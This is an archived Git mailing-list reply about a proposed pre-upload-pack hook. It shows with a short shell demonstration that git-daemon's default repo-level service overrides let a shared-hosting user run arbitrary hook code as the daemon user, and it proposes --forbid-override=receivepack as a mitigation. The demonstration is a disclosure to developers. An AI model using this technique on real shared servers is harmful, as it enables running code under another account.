From: Jeff King <peff@peff.net>
Subject: Re: what are the chances of a 'pre-upload' hook?
Date: Mon, 28 Nov 2011 03:17:48 -0500
Message-ID: <20111128081748.GC16901@sigill.intra.peff.net>
References: <7v8vn2vt8p.fsf@alter.siamese.dyndns.org>
 <7vmxbivw8u.fsf@alter.siamese.dyndns.org>
 <20111128075107.GA16901@sigill.intra.peff.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=utf-8
Cc: Sitaram Chamarty <sitaramc@gmail.com>,
	Git Mailing List <git@vger.kernel.org>
To: Junio C Hamano <gitster@pobox.com>
X-From: git-owner@vger.kernel.org Mon Nov 28 09:18:01 2011
Return-path: <git-owner@vger.kernel.org>
Envelope-to: gcvg-git-2@lo.gmane.org
Received: from vger.kernel.org ([209.132.180.67])
	by lo.gmane.org with esmtp (Exim 4.69)
	(envelope-from <git-owner@vger.kernel.org>)
	id 1RUwPX-000430-4m
	for gcvg-git-2@lo.gmane.org; Mon, 28 Nov 2011 09:17:59 +0100
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752002Ab1K1IRw (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
	Mon, 28 Nov 2011 03:17:52 -0500
Received: from 99-108-226-0.lightspeed.iplsin.sbcglobal.net ([99.108.226.0]:53961
	"EHLO peff.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1751070Ab1K1IRu (ORCPT <rfc822;git@vger.kernel.org>);
	Mon, 28 Nov 2011 03:17:50 -0500
Received: (qmail 22387 invoked by uid 107); 28 Nov 2011 08:24:23 -0000
Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
  (smtp-auth username relayok, mechanism cram-md5)
  by peff.net (qpsmtpd/0.84) with ESMTPA; Mon, 28 Nov 2011 03:24:23 -0500
Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Mon, 28 Nov 2011 03:17:48 -0500
Content-Disposition: inline
In-Reply-To: <20111128075107.GA16901@sigill.intra.peff.net>
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org
Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/186004>

On Mon, Nov 28, 2011 at 02:51:07AM -0500, Jeff King wrote:

> > I actually like the idea of allowing pre-upload-pack hook on git:// and
> > possibly http:// only. git-daemon can tell the upload-pack that it is OK
> > to run the hook, and the hook can do the things that only the daemon can
> > do, never touching what the original requestor would but the repository
> > owner would not have an access to.
> 
> That's not necessarily safe. Think about a site like kernel.org. The
> administrator is the one running the daemon, on behalf of all of the
> users. But my impression is that pre-August, developers had shell access
> to their own repos and could write their own hook files. So if
> git-daemon runs hooks, then any repo owner could run arbitrary code as
> the git-daemon, including killing the running daemon and running their
> own trojan.

Actually, depending on how kernel.org (or other similar sites) run the
daemon, this might be an issue even without further patches. By default,
git-daemon lets the enable/disable flag for any service be overridden by
the repo config. So something like this:

  # make an evil repo; imagine this is done by a user on a shared
  # hosting site which allows shell access.
  git init --bare evil &&
  cat >evil/hooks/update <<\EOF &&
  #!/bin/sh
  echo >&2 "executing arbitrary code as `id`"
  EOF
  git --git-dir=evil config daemon.receivepack true &&
  touch evil/git-daemon-export-ok &&
  chmod -R 777 evil

  # now serve the repo as a daemon running as some other
  # user. This simulates the admin of a shared git hosting
  # site running git-daemon.
  sudo su -c 'git daemon --verbose --base-path="$PWD"' nobody

and then push from anywhere:

  $ git push --all git://localhost/evil
  ...
  remote: executing arbitrary code as uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

You can avoid this by setting --forbid-override=receivepack; I wonder if
that should be the default.

-Peff
